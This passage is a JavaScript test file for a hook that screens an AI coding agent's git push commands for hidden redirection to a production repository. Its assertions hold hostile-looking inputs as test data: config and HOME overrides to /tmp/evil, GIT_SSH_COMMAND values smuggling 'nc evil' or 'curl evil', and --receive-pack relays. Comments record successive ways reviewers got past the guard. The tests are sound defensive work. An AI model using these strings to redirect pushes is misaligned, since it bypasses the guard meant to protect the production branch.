assert.equal(pushUsesConfigEnv("New-Item -Path Env:GIT_CONFIG_KEY_0 -Value remote.origin.pushurl; git push origin main"), true, "PowerShell New-Item form");
// Not named by the round-6 review — found while probing it. A detector that
// enumerates syntax would have missed this one next.
assert.equal(pushUsesConfigEnv("[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT','1'); git push origin main"), true, ".NET SetEnvironmentVariable form");
// Controls: the broadened rule must not start denying ordinary pushes.
assert.equal(pushUsesConfigEnv("git -C C:/CRX_Manager push origin feature"), false, "an ordinary push does not name the namespace");
assert.equal(pushUsesConfigEnv('GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" git -C /repo push origin feature'), false, "the keepalive workaround still passes");
assert.equal(pushUsesConfigEnv("Set-Item Env:GIT_CONFIG_COUNT 1"), false, "still only applies to push commands");

// --- a GIT_CONFIG* variable set by an EARLIER command (Codex 2026-07-30, round 6)
// The push command text is innocent; the variable is live in the environment the
// push inherits. The hook inherits the same one, so it checks directly.
assert.deepEqual(environmentCarriesConfigOverride({ PATH: "/usr/bin", GIT_EDITOR: "vi" }), [], "an ordinary environment is clean");
assert.deepEqual(environmentCarriesConfigOverride({ GIT_CONFIG_COUNT: "1" }), ["GIT_CONFIG_COUNT"]);
assert.deepEqual(environmentCarriesConfigOverride({ GIT_CONFIG_PARAMETERS: "x" }), ["GIT_CONFIG_PARAMETERS"]);
assert.deepEqual(environmentCarriesConfigOverride({ GIT_CONFIG: "/tmp/evil" }), ["GIT_CONFIG"]);
assert.deepEqual(environmentCarriesConfigOverride({ MY_GIT_CONFIG_COUNT: "1" }), [], "an unrelated variable is not an override");
assert.deepEqual(environmentCarriesConfigOverride({ GIT_SSH_COMMAND: "ssh" }), [], "transport variables are not destination overrides");
assert.deepEqual(environmentCarriesConfigOverride(null), [], "a missing environment is not a crash");

// --- config ROOT overrides (Codex 2026-07-30, round 7) -------------------------
// GIT_CONFIG* names a config file; HOME/XDG_CONFIG_HOME name the directory git
// searches for the global one. Proven against git 2.54 the same day: with HOME
// pointed at a scratch dir holding a .gitconfig with url.<real>.pushInsteadOf,
// `git push origin HEAD:main` landed in <real> while `git config --get-regexp
// '^url\..*insteadof$'` in the guard's own environment returned nothing.
assert.equal(pushUsesConfigRootEnv(`HOME=/tmp/evil git -C /repo push origin main`), true, "inline HOME override");
assert.equal(pushUsesConfigRootEnv(`XDG_CONFIG_HOME=/tmp/evil git push origin main`), true, "inline XDG_CONFIG_HOME override");
assert.equal(pushUsesConfigRootEnv(`env 'HOME=/tmp/evil' git push origin main`), true, "quoted HOME override");
assert.equal(pushUsesConfigRootEnv(`$env:HOME = "/tmp/evil"; git push origin main`), true, "PowerShell HOME override");
assert.equal(pushUsesConfigRootEnv(`Set-Item Env:USERPROFILE C:/evil; git push origin main`), true, "PowerShell USERPROFILE override");
assert.equal(pushUsesConfigRootEnv(`GIT_OBJECT_DIRECTORY=/tmp/o git push origin main`), true, "object-directory override");
assert.equal(pushUsesConfigRootEnv("git -C C:/CRX_Manager push origin feature"), false, "an ordinary push names none of them");
assert.equal(pushUsesConfigRootEnv("HOME=/tmp/evil git status"), false, "still only applies to push commands");
assert.equal(pushUsesConfigRootEnv("git push origin chore/HOMEPAGE-copy"), false, "a branch name containing HOMEPAGE is not an override");
// `_` is a word character in a variable NAME, so BOTH boundaries have to exclude
// it. The lookbehind already did; the lookahead did not, so any longer name
// beginning with one of these and continuing past an underscore matched its own
// prefix, and an ordinary push carrying an unrelated variable denied.
// (CodeRabbit, 2026-08-05 — its `GIT_DIRTY` example never actually matched,
// since `T` was already excluded; the gap was the underscore specifically.)
assert.equal(pushUsesConfigRootEnv("HOME_DIR=/tmp/x git push origin main"), false, "HOME_DIR is not HOME");
assert.equal(pushUsesConfigRootEnv("GIT_DIR_BACKUP=/tmp/x git push origin main"), false, "GIT_DIR_BACKUP is not GIT_DIR");
assert.equal(pushUsesConfigRootEnv("GIT_DIRTY=1 git push origin main"), false, "GIT_DIRTY is not GIT_DIR");
assert.equal(pushUsesConfigRootEnv("MY_HOME=/tmp/x git push origin main"), false, "a variable ENDING in HOME is not HOME");
assert.equal(pushUsesConfigRootEnv("GIT_DIR=/tmp/evil git push origin main"), true, "...but the real GIT_DIR still fires");
// 2026-08-05: the check denied every Linux `git -C /home/... push`, because the
// case-insensitive bare-text match hit the `/home/` path segment. That is the
// form this guard's own denial messages recommend, so on a web/mobile session
// the guard was telling the user to run a command it then refused.
assert.equal(
  pushUsesConfigRootEnv("git -C /home/user/CRX_Manager_V1.0 push -u origin feature/x"), false,
  "a repo path under /home is not a HOME override",
);
assert.equal(
  pushUsesConfigRootEnv("git -C /home/user/repo push origin HEAD:main"), false,
  "the /home path segment does not fire even on a main-bound push",
);
assert.equal(
  pushUsesConfigRootEnv("git -C C:\\Users\\mason\\homepath push origin feature"), false,
  "a Windows path segment is not an override either",
);
// 2026-08-06, the same over-refusal one round later: the fix above covered the
// `/home/` separator but not a path SEGMENT spelled with hyphens, and this
// environment names its scratch directories exactly that way — so `git -C
// /tmp/claude-0/-home-user-.../work push` was refused, which is what blocked the
// scratch-repo reproduction of the refspec fix in this same change.
assert.equal(
  pushUsesConfigRootEnv("git -C /tmp/claude-0/-home-user-CRX-Manager-V1-0/abc/scratchpad/work push origin main:refs/heads/feature"), false,
  "a hyphen-delimited -home-user- path segment is not a HOME override",
);
assert.equal(
  pushUsesConfigRootEnv("git push origin chore/HOME-copy"), false,
  "a branch name ending in a hyphen after HOME is not an override",
);
// ...and the real overrides still fire from every position they can occupy.
assert.equal(pushUsesConfigRootEnv("env HOME=/home/user/evil git push origin main"), true, "an override whose VALUE is a /home path still fires");
assert.equal(pushUsesConfigRootEnv("HOME=/tmp/x git -C /home/user/repo push origin main"), true, "a real override alongside a /home repo path still fires");
assert.equal(
  pushUsesConfigRootEnv("HOME=/tmp/evil git -C /tmp/claude-0/-home-user-CRX/work push origin main"), true,
  "a real override alongside a hyphenated scratch path still fires",
);
assert.equal(
  pushUsesConfigRootEnv("$env:HOME = \"/tmp/evil\"; git -C /tmp/claude-0/-home-user-CRX/work push origin main"), true,
  "the PowerShell form still fires alongside a hyphenated scratch path",
);

// The general rule behind both: the guard resolves the destination in ITS
// environment, so a push carrying ANY variable the guard does not is a push the
// guard cannot vouch for. Allowlist, not denylist — naming variables one at a
// time failed rounds four, five, six and seven.
assert.deepEqual(pushSetsInlineEnv(`SOME_NEW_GIT_VAR=x git -C /repo push origin main`), ["SOME_NEW_GIT_VAR"], "an unheard-of variable is still denied");
assert.deepEqual(pushSetsInlineEnv(`env 'HOME=/tmp/evil' git push origin main`), ["HOME"], "the `env` form is seen too");
assert.deepEqual(pushSetsInlineEnv(`A=1 B=2 git push origin main`), ["A", "B"], "every assignment is reported");
assert.deepEqual(pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" git -C /repo push origin feature`), [], "the sanctioned transport prefix is allowed");
assert.deepEqual(pushSetsInlineEnv("git -C C:/CRX_Manager push origin feature"), [], "an ordinary push sets nothing");
assert.deepEqual(pushSetsInlineEnv(`FOO=1 npm run build && git -C /repo push origin main`), [], "an assignment on an EARLIER chained command is not this push's prefix");
assert.deepEqual(pushSetsInlineEnv("HOME=/tmp/evil git status"), [], "still only applies to push commands");

// Round 9: GIT_SSH_COMMAND is an arbitrary command line git executes, not a
// transport setting. It can ignore the destination git hands it and run
// git-receive-pack against production while the guard reads only the innocent
// nominal destination. So the allowlist is by name AND value: the documented
// keepalive shape, and nothing else.
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh -o ProxyCommand=nc evil 22" git push origin feature`),
  ["GIT_SSH_COMMAND"], "an unapproved ssh option is denied",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="sh -c 'ssh prod git-receive-pack repo.git'" git push origin feature`),
  ["GIT_SSH_COMMAND"], "a shell command disguised as the transport is denied",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh evil-host" git push origin feature`),
  ["GIT_SSH_COMMAND"], "an ssh value naming a host is denied",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20 && curl evil" git push origin feature`),
  ["GIT_SSH_COMMAND"], "the keepalive shape with anything appended is denied",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20 -o ServerAliveCountMax=5" git push origin feature`),
  [], "the full documented keepalive form is still allowed",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND=ssh git push origin feature`), [], "plain ssh is still allowed",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_TERMINAL_PROMPT=0 git push origin feature`), [], "the documented prompt value is allowed",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_TERMINAL_PROMPT="$(curl evil)" git push origin feature`),
  ["GIT_TERMINAL_PROMPT"], "anything but 0 or 1 is denied",
);

// --- the splitter is escape-aware (Codex 2026-07-30, round 10) -----------------
// `\"` inside double quotes is an escaped quote, so the string ends at the FINAL
// quote. Tracking quotes without escapes reopened one there and swallowed every
// separator after it — the whole line became a single segment and a main-bound
// push at the end was never classified.
{
  const segments = shellSegments(`echo "a\\"b" && git push origin feature && git push origin HEAD:main`);
  assert.equal(segments.length, 3, "an escaped quote does not merge the whole line into one segment");
  assert.match(segments[2], /git push origin HEAD:main\s*$/, "the last segment is the main-bound push, on its own");
}
// A backslash is literal inside SINGLE quotes, so the quote closes at the next
// one and the separator after it is real.
assert.equal(
  shellSegments(`echo 'a\\' && git push origin main`).length, 2,
  "a backslash inside single quotes is literal, so the following separator still splits",
);
// A separator that is itself escaped is not a separator. (`\;` is a literal
// semicolon to bash, so this is one command, not two.)
assert.equal(
  shellSegments(`echo a\\; git push origin main`).length, 1,
  "an escaped separator does not split",
);
// Line continuations join, they do not split.
assert.equal(
  shellSegments("git push \\\norigin main").length, 1,
  "a line continuation keeps one command together",
);
// The escape handling must not have re-broken the round-9 case.
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20 && curl evil" git push origin feature`),
  ["GIT_SSH_COMMAND"], "quoted separators are still part of the value",
);

// --- options the argv walk does not understand (Codex 2026-07-30, round 7) -----
// `--recurse-submodules` takes a SEPARATE value. Verified against git 2.54 on
// 2026-07-30: with a remote literally named `no`, `git push --recurse-submodules
// no <urlA> HEAD:main` pushed to urlA — git ate `no` as the option's value while
// the guard read it as the destination and classified the push as unguarded.
assert.equal(
  pushDestinationToken(`git push --recurse-submodules no ${CRX_URL} HEAD:main`),
  CRX_URL,
  "--recurse-submodules consumes its value, so the URL is the destination",
);
assert.equal(
  pushDestinationToken(`git push --recurse-submodules=no ${CRX_URL} HEAD:main`),
  CRX_URL,
  "the attached form consumes nothing extra",
);
assert.equal(
  pushDestinationToken(`git push -uo ci.skip ${CRX_URL} HEAD:main`),
  CRX_URL,
  "a bundled short form hiding -o still consumes its value",
);
// And the backstop: the option list is no longer trusted to be complete, so
// anything unrecognised makes the walk — and therefore the destination — void.
assert.deepEqual(unknownPushOptions("git push --some-future-option x origin main"), ["--some-future-option"]);
assert.deepEqual(unknownPushOptions("git push --some-future-option=x origin main"), ["--some-future-option"]);
assert.deepEqual(unknownPushOptions("git push -Z origin main"), ["-Z"], "an unknown short option counts too");
assert.deepEqual(unknownPushOptions("git push --recurse-submodules no origin main"), [], "the newly-taught option is known");
assert.deepEqual(unknownPushOptions("git push --force-with-lease --follow-tags --atomic -u origin main"), [], "ordinary options are all known");
assert.deepEqual(unknownPushOptions("git push --no-verify origin main"), [], "a --no- negation resolves to its base option");
assert.deepEqual(unknownPushOptions("git push -fu origin main"), [], "a bundle of known short options is fine");
assert.deepEqual(unknownPushOptions("git push origin main -- --not-an-option"), [], "everything after -- is a refspec");
assert.deepEqual(unknownPushOptions("git status --weird"), [], "non-pushes are not scanned");

// --- the receive-pack program (Codex 2026-07-30, round 17)
// Not a parsing question: the argv walk skips these values correctly. The option
// names the program that RECEIVES the objects, and that program decides where
// they actually go — so the destination every other check classifies stops being
// the destination. Denied outright; nothing here ever needs it.
assert.equal(pushNamesRemoteProgram("git push --receive-pack=/tmp/relay origin main"), true);
assert.equal(pushNamesRemoteProgram("git push --receive-pack /tmp/relay origin main"), true, "separate-value spelling");
assert.equal(pushNamesRemoteProgram("git push --exec=/tmp/relay origin main"), true, "the --exec alias");
assert.equal(pushNamesRemoteProgram("git push --exec /tmp/relay origin main"), true);
assert.equal(
  pushNamesRemoteProgram(`git push origin feature && git push --exec=/tmp/relay ${CRX_URL} HEAD:main`),
  true,
  "a later push in the same command is scanned too",
);
assert.equal(pushNamesRemoteProgram("git push origin main"), false, "an ordinary push is untouched");
assert.equal(
  pushNamesRemoteProgram("git push origin main -- --receive-pack=/tmp/relay"),
  false,
  "after `--` it is a refspec, not an option",
);
assert.equal(pushNamesRemoteProgram("git commit -m 'exec --receive-pack'"), false, "non-pushes are not scanned");

// --- a harmless FIRST push must not hide a second one (Codex 2026-07-30, round 8)
// A whole-command scan that stopped at the first match saw neither the abbreviated
// option nor the inline variable on the second push. git accepts unambiguous
// abbreviations of long options, so `--recurse-submodule` is a real command.
assert.deepEqual(
  unknownPushOptions(`git push origin feature && git push --recurse-submodule no ${CRX_URL} HEAD:main`),
  ["--recurse-submodule"],
  "a later push's unknown option is found",
);
assert.deepEqual(
  unknownPushOptions(`git push origin feature; git push -Z origin main`),
  ["-Z"],
  "the scan crosses a `;` separator too",
);
assert.deepEqual(
  pushSetsInlineEnv(`git push origin feature && HOME=/tmp/evil git push origin main`),
  ["HOME"],
  "a later push's inline variable is found",
);
assert.deepEqual(
  pushSetsInlineEnv(`GIT_SSH_COMMAND="ssh" git push origin feature && git push origin main`),
  [],
  "a chained pair of clean pushes stays clean",
);

// --- `--repo` vs a positional destination -------------------------------------
// git-push: "if both are specified, the command-line argument takes precedence".
// Verified against git 2.54 on 2026-07-30.
assert.equal(
  pushDestinationToken(`git push --repo=https://example.invalid/harmless.git ${CRX_URL} HEAD:main`),
  CRX_URL,
  "a positional destination overrides --repo, exactly as git does",
);
assert.equal(pushDestinationToken(`git push --repo=${CRX_URL}`), CRX_URL, "--repo still names the destination when there is no positional");
assert.equal(pushDestinationToken(`git push --repo ${CRX_URL}`), CRX_URL, "separate-argument --repo form");
assert.equal(pushDestinationToken(`git push --repo=${CRX_URL} -- origin main`), "origin", "after `--` the positional still wins");
assert.equal(pushDestinationToken("git push origin main"), "origin");
assert.equal(pushDestinationToken("git push"), null);

// ── pushNamesRefspec: does git consult the DEFAULT refspec configuration? ────
// `git push [<repository> [<refspec>…]]` — with refspecs on the command line git
// never reads `remote.<n>.push` / `push.default` / `branch.<b>.merge`, so an
// inherited override of those cannot move such a push and comparing them only
// produces over-refusals (Codex, 2026-08-06). Everything uncertain answers
// `false`, which KEEPS the comparison; only a plainly-explicit push skips it.
assert.equal(pushNamesRefspec("git push origin main:refs/heads/feature"), true, "remote plus refspec");
assert.equal(pushNamesRefspec("git push origin main"), true, "a plain branch name is still a refspec");
assert.equal(pushNamesRefspec("git push -u origin HEAD:main"), true, "a valueless option does not consume the refspec");
assert.equal(pushNamesRefspec("git push --force-with-lease=main origin main"), true, "an `=`-form option consumes no positional");
assert.equal(pushNamesRefspec("git push -o ci.skip origin main"), true, "a short value-taking option consumes its own value only");
assert.equal(pushNamesRefspec("git push origin -- main"), true, "positionals after `--` still count");
assert.equal(pushNamesRefspec("git push origin"), false, "a remote alone is bare — git falls back to the default refspec");
assert.equal(pushNamesRefspec("git push"), false, "no arguments at all is bare");
assert.equal(pushNamesRefspec("git push --force"), false, "an option is not a refspec");
assert.equal(pushNamesRefspec("git push --receive-pack=git-receive-pack origin"), false, "still bare once the `=`-form option is discounted");
// `--repo=<url>` names the REPOSITORY, and git documents the positional as
// taking precedence — so the lone positional here is the destination, not a
// refspec, and skipping the lookups on it would fail open.
assert.equal(pushNamesRefspec(`git push --repo=${CRX_URL} origin`), false, "--repo does not turn the lone positional into a refspec");
assert.equal(pushNamesRefspec(`git push --repo ${CRX_URL} origin main`), true, "…but its value is consumed, so `origin main` is still repository plus refspec");
// An option this walk cannot account for could leave its VALUE looking like a
// refspec, so an unreadable push keeps the lookups rather than skipping them.
assert.equal(pushNamesRefspec("git push --future-option origin main:refs/heads/feature"), false, "an unknown option makes the count untrustworthy");

// ── full-hook end-to-end: the guard itself, driven over stdin ────────────────
// Codex round-4 (2026-07-30) asked for these specifically, and it was right to:
// the helper assertions above were all green while an earlier version of this
// same check sat in the wrong place in the hook and let the chained form
// through. Exercising the HOOK is the only thing that proves the gate closed.
{
  const HOOK = path.join(path.dirname(fileURLToPath(import.meta.url)), "codex-push-guard.mjs");
  const tmp = mkdtempSync(path.join(os.tmpdir(), "codex-push-guard-env-"));
  const work = path.join(tmp, "work");
  const dest = path.join(tmp, "dest.git");
  const git = (args, cwd) => spawnSync("git", args, { cwd, encoding: "utf8", env: scratchHookEnvironment(cwd, process.env) });

  const runHook = (command, extraEnv = {}) => {
    const res = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({ cwd: work, tool_input: { command } }),
      encoding: "utf8",
      env: { ...scratchHookEnvironment(work, process.env), ...extraEnv },
    });
    assert.equal(res.status, 0, `guard exited ${res.status}: ${res.stderr}`);
    const out = (res.stdout || "").trim();
    if (!out) return { decision: "allow", reason: "" };
    const hook = JSON.parse(out).hookSpecificOutput;
    return { decision: hook.permissionDecision, reason: hook.permissionDecisionReason };
  };

  try {
    mkdirSync(work, { recursive: true });
    const init = git(["init", "-q", "--bare", dest], tmp);
    assert.equal(init.status, 0, `bare init failed: ${init.stderr}`);
    git(["init", "-q", "-b", "main"], work);
    git(["config", "user.email", "test@example.com"], work);
    git(["config", "user.name", "test"], work);
    writeFileSync(path.join(work, "seed.txt"), "seed\n");
    git(["add", "seed.txt"], work);
    const seeded = git(["commit", "-qm", "seed"], work);
    assert.equal(seeded.status, 0, `scratch commit failed: ${seeded.stderr}`);
    // `origin` deliberately points at a local bare repo, NOT the app repo, so the
    // control case below reaches the end of the guard and is genuinely allowed.
    git(["remote", "add", "origin", dest], work);

    const push = `git -C ${work} push origin main`;
    // An ordinary non-production push. The main-bound checks exit before the
    // app-repo gate for this one, which is what makes it the right shape for
    // asking "does an inherited GIT_CONFIG* variable block a normal push?".
    const featurePush = `git -C ${work} push origin main:refs/heads/feature`;
    // A push that names NO refspec, so git falls back to the default-refspec
    // configuration (`push.default`, `remote.<n>.push`, `branch.<b>.merge`). The
    // two forms are not interchangeable for those keys: git reads them for this
    // one and not for `featurePush`, so each default-refspec case below is
    // asserted on whichever form actually consults it (2026-08-06).
    const barePush = `git -C ${work} push origin`;
    // A push that names NO destination either, so git additionally falls back to
    // the remote-SELECTION configuration (`branch.<b>.pushRemote`,
    // `remote.pushDefault`, `branch.<b>.remote`). `barePush` does not reach those:
    // naming `origin` already answers which remote, which is why the two are
    // separate fixtures. Reproduced on git 2.43.0 for all three keys, each set to
    // a second remote: `push --dry-run --porcelain` lands on the OTHER remote for
    // this form, and on `origin` for `push origin …`, `push origin`, and
    // `push --repo=origin` alike (2026-08-06).
    const remotelessPush = `git -C ${work} push`;
    const deniedBecause = (command, pattern, message) => {
      const result = runHook(command);
      assert.equal(result.decision, "deny", `${message} — got ${result.decision}`);
      assert.match(result.reason, pattern, `${message} — denial should explain itself`);
    };
    const denied = (command, message) => deniedBecause(command, /GIT_CONFIG/, message);

    denied(`env 'GIT_CONFIG_COUNT=1' 'GIT_CONFIG_KEY_0=remote.origin.pushurl' 'GIT_CONFIG_VALUE_0=${CRX_URL}' ${push}`, "single-quoted env assignments");
    denied(`env "GIT_CONFIG_COUNT=1" "GIT_CONFIG_KEY_0=remote.origin.pushurl" ${push}`, "double-quoted env assignments");
    denied(`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=${CRX_URL} ${push}`, "bare env assignments");
    denied(`export GIT_CONFIG_KEY_0=remote.origin.pushurl; ${push}`, "assignment in its own command segment");
    denied(`$env:GIT_CONFIG_COUNT = "1"; ${push}`, "PowerShell env form");
    // The round-5 form, end-to-end against a checkout whose configured `origin`
    // is an unrelated local repo: this is exactly the shape that would have
    // redirected the push to production while every lookup the guard makes
    // still described the harmless remote.
    denied(`GIT_CONFIG_PARAMETERS="'remote.origin.pushurl=${CRX_URL}'" ${push}`, "GIT_CONFIG_PARAMETERS redirect");
    denied(`env 'GIT_CONFIG_PARAMETERS=remote.origin.pushurl=${CRX_URL}' ${push}`, "quoted GIT_CONFIG_PARAMETERS redirect");
    // Round-6 forms: PowerShell has more than one way to set a variable, and the
    // detector used to describe the syntax rather than the namespace.
    denied(`Set-Item Env:GIT_CONFIG_COUNT 1; ${push}`, "PowerShell Set-Item");
    denied(`\${env:GIT_CONFIG_COUNT} = '1'; ${push}`, "PowerShell \${env:…}");
    denied(`New-Item -Path Env:GIT_CONFIG_KEY_0 -Value remote.origin.pushurl; ${push}`, "PowerShell New-Item");
    denied(`[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT','1'); ${push}`, ".NET SetEnvironmentVariable");

    // The other half of round 6: the push command is innocent, but a variable
    // set by an EARLIER command is still live in the environment the push
    // inherits. The hook inherits it too, so it denies on what it can see.
    {
      const result = runHook(push, { GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "remote.origin.pushurl", GIT_CONFIG_VALUE_0: CRX_URL });
      assert.equal(result.decision, "deny", "an innocent push command inheriting GIT_CONFIG* is denied");
      assert.match(result.reason, /GIT_CONFIG_COUNT/, "the denial names the variable that is set");
    }

    // 2026-08-04: presence alone used to be the test, which denied every push
    // from an environment that routes git through a credential proxy (Claude
    // Code on the web installs a `url.…insteadOf` rewrite exactly this way) and
    // made web/mobile sessions unable to push at all. The question is now whether
    // the variables CHANGE an answer the guard classifies the push from — read
    // once stripped, once as the push will see them, and compared.
    {
      // THE REGRESSION THIS CHANGE EXISTS FOR. A credential proxy installs a URL
      // rewrite through GIT_CONFIG_*; `remote -v` is unchanged, no refspec or
      // carrier moves, so an ordinary feature-branch push has nothing to
      // disagree about and proceeds. Before 2026-08-04 the mere presence of the
      // variables denied this, which locked every web/mobile session out of
      // pushing anything at all.
      const result = runHook(featurePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "url.http://proxy.invalid/.insteadOf",
        GIT_CONFIG_VALUE_0: "https://unrelated.invalid/",
      });
      assert.equal(result.decision, "allow", "an inherited rewrite that moves nothing in this repo is allowed");
    }
    {
      // Same ordinary push, but the variables move the destination to production.
      // `remote -v` diverges between the stripped and inherited reads, so it dies.
      const result = runHook(featurePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.pushurl",
        GIT_CONFIG_VALUE_0: CRX_URL,
      });
      assert.equal(result.decision, "deny", "an inherited pushurl redirect is denied on an ordinary push too");
      assert.match(result.reason, /remotes/, "the denial names the answer that changed");
    }
    {
      // Same mechanism, but the rewrite makes a short alias reach production.
      // The rewrite table is not compared for equality — it is UNIONED into the
      // gate's own classifier — so this is caught by the app-repo gate applying
      // to a main-bound push, which then demands the Sol proof. Denied either
      // way; what matters is that a rewrite visible ONLY in the inherited
      // environment still gates, which the pre-2026-08-04 single scrubbed read
      // would have missed entirely had presence not been blanket-denied.
      const result = runHook(push, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: `url.${CRX_URL}.insteadOf`,
        GIT_CONFIG_VALUE_0: "crx:",
      });
      assert.equal(result.decision, "deny", "an inherited rewrite that reaches the production app repo still gates");
      // Getting THIS far is the proof: both messages come from inside the
      // app-repo gate, i.e. past the "unrelated repository, skip the gate" exit.
      // (The scratch remote has never been pushed to, so origin/main is the ref
      // that fails first; on a real checkout it is the Sol proof demand.)
      assert.match(result.reason, /proof|origin\/main/i, "the app-repo gate applied rather than being skipped");
    }
    {
      // Not the destination but the REFSPEC: a bare push's default can be moved
      // by config just as invisibly, so those answers are compared too.
      const result = runHook(barePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "push.default",
        GIT_CONFIG_VALUE_0: "matching",
      });
      assert.equal(result.decision, "deny", "an inherited refspec-default override is denied");
      assert.match(result.reason, /push\.default/, "the denial names the answer that changed");
    }
    {
      // And the remote a bare push would pick — asserted on the form that actually
      // consults it. This case used to ride on `featurePush`, which was the fifth
      // over-refusal of this shape (Codex, 2026-08-06): git never reads the
      // remote-selection keys once the command names its destination, so comparing
      // them denied the required feature-branch landing path over a key the push
      // could not have used. Both directions are pinned below.
      for (const key of ["remote.pushDefault", "branch.pushRemote", "branch.remote"]) {
        const env = {
          GIT_CONFIG_COUNT: "1",
          GIT_CONFIG_KEY_0: key === "remote.pushDefault" ? key : `branch.main.${key.slice("branch.".length)}`,
          GIT_CONFIG_VALUE_0: "elsewhere",
        };
        const denied = runHook(remotelessPush, env);
        assert.equal(denied.decision, "deny", `an inherited ${key} override is denied on a push that names no remote`);
        assert.match(denied.reason, new RegExp(key.replace(".", "\\.")), "the denial names the answer that changed");

        const allowed = runHook(featurePush, env);
        assert.notEqual(
          allowed.decision,
          "deny",
          `${key} must not deny a push that names its destination — git never consults it there`,
        );
      }
    }
    {
      // 2026-08-06, the fourth over-refusal of this shape. `remote.*.push` is read
      // repository-WIDE by regexp, but git consults only the remote the push
      // resolves to, so an inherited refspec for a remote this push never touches
      // used to diverge and deny. Two failures stacked here: the comparison was
      // unscoped, and `--get-regexp` exits 1 when nothing matches — so once the
      // ambient side was scoped down to nothing, one side read `err:1` and the
      // other an empty match, which is absence on both sides, not a difference.
      git(["remote", "add", "archive", path.join(tmp, "archive.git")], work);
      const result = runHook(barePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.archive.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/archive",
      });
      assert.equal(result.decision, "allow", "an inherited refspec for a remote this push never consults is allowed");
    }
    {
      // The other side of that scoping: the SAME override on the remote the push
      // actually selects moves where this push lands, and must still die. This is
      // what keeps the fix above from being widened into a fail-open.
      const result = runHook(barePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/main",
      });
      assert.equal(result.decision, "deny", "an inherited refspec on the targeted remote is still denied");
      assert.match(result.reason, /remote\.\*\.push/, "the denial names the answer that changed");
    }
    {
      // 2026-08-06, the fifth over-refusal of this shape, and the one Codex
      // reproduced against git itself: the override above is fatal to a BARE push
      // and inert against this one. `git push [<repository> [<refspec>…]]` — with
      // refspecs on the command line git never reads the default-refspec keys, so
      // comparing them denied the exact feature-branch push this repo's protected
      // `main` requires. `--dry-run` under that inherited value updates only
      // `feature`; the same value on `barePush` moves it.
      const result = runHook(featurePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/main",
      });
      assert.equal(result.decision, "allow", "a default refspec git never consults does not block an explicit push");
    }
    {
      // The fix keys off the refspec being NAMED, not off the command being long:
      // an option the argv walk cannot account for could leave its own value
      // looking like a refspec, so an unreadable push keeps the lookups (and dies
      // on the unknown option, which is the same answer for a different reason).
      const result = runHook(`git -C ${work} push --future-option origin main:refs/heads/feature`, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/main",
      });
      assert.equal(result.decision, "deny", "an unreadable push does not get the explicit-refspec skip");
    }
    {
      // 2026-08-06, Codex's PR #313 review — the NINTH over-refusal of this
      // shape, and the one that shows a single command-wide verdict was still too
      // coarse. A command that MIXES the forms keeps `remote.*.push` compared,
      // correctly, because the bare `push archive` reads it — but the answer was
      // scoped to every remote the command touches, so an inherited
      // `remote.origin.push` denied it even though the origin push names its own
      // refspec and git reads that key for NEITHER push. `git push -h` documents
      // the forms per invocation; the dry-run destinations are identical with and
      // without the variable.
      const mixed = `git -C ${work} push origin main:refs/heads/feature && git -C ${work} push archive`;
      assert.equal(
        runHook(mixed, {
          GIT_CONFIG_COUNT: "1",
          GIT_CONFIG_KEY_0: "remote.origin.push",
          GIT_CONFIG_VALUE_0: "HEAD:refs/heads/main",
        }).decision,
        "allow",
        "a default refspec belonging to the explicit push's remote is read by neither push",
      );
      // The control that keeps the narrowing from becoming a fail-open: the same
      // override aimed at `archive` — the remote whose push IS bare — moves where
      // that push lands and must still die.
      const denied = runHook(mixed, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.archive.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/main",
      });
      assert.equal(denied.decision, "deny", "the same override on the bare push's own remote is still denied");
      assert.match(denied.reason, /remote\.\*\.push/, "the denial names the answer that changed");
      // And the narrowing is specific to `remote.*.push`: `remote.<n>.mirror` is
      // read for an explicit push too, so it stays on the wider scope and an
      // inherited mirror on the explicit push's remote still denies.
      assert.equal(
        runHook(mixed, {
          GIT_CONFIG_COUNT: "1",
          GIT_CONFIG_KEY_0: "remote.origin.mirror",
          GIT_CONFIG_VALUE_0: "true",
        }).decision,
        "deny",
        "mirror is not a default-refspec key and keeps the wider remote scope",
      );
    }
    {
      // 2026-08-06, Codex's PR #313 review — the SIXTH over-refusal of this shape,
      // and one level below the refspec verdict above. A bare push does read the
      // default-refspec configuration, but only some `push.default` modes derive
      // the refspec from `branch.<b>.merge`; under `current` git names the
      // destination from the branch and never opens the key, so comparing it
